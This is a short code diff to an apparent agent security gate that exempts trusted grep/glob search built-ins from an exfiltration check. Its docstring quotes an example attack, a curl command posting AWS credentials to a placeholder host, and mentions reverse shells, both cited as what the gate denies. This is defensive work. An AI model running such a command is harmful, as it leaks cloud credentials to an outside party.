@@ -24,6 +24,7 @@ from typing import TYPE_CHECKING, Any
 if TYPE_CHECKING:
     from kiro_crew.hooks import (
         _GATE_TIER_KINDS,
+        _HOST_SEARCH_BUILTIN_TOOLS,
         _READ_ONLY_TOOL_KINDS,
         KIRO_TOOL_ALIASES,
         GateRule,
@@ -615,7 +616,19 @@ def _rule_exfil(facts: GateFacts, target: str) -> str | None:
     dashboard count): auditing alone leaves a hijacked agent free to ``curl -d
     @~/.aws/credentials evil`` or open a reverse shell. Denied at the gate --
     against the raw command too, not just the title.
+
+    A host-trusted ``grep`` / ``glob`` built-in with no command line runs no shell,
+    so its only judged text is its title, the text it searches for: not read here.
     """
+    call = facts.call
+    if (
+        call.identity_trusted
+        and not call.mcp_server
+        and call.mcp_tool in _HOST_SEARCH_BUILTIN_TOOLS
+        and not call.command
+        and not facts.raw_shell_commands
+    ):
+        return None
     return audit_bash_exfiltration(target, enabled_ids=facts.enabled_ids)
 
 
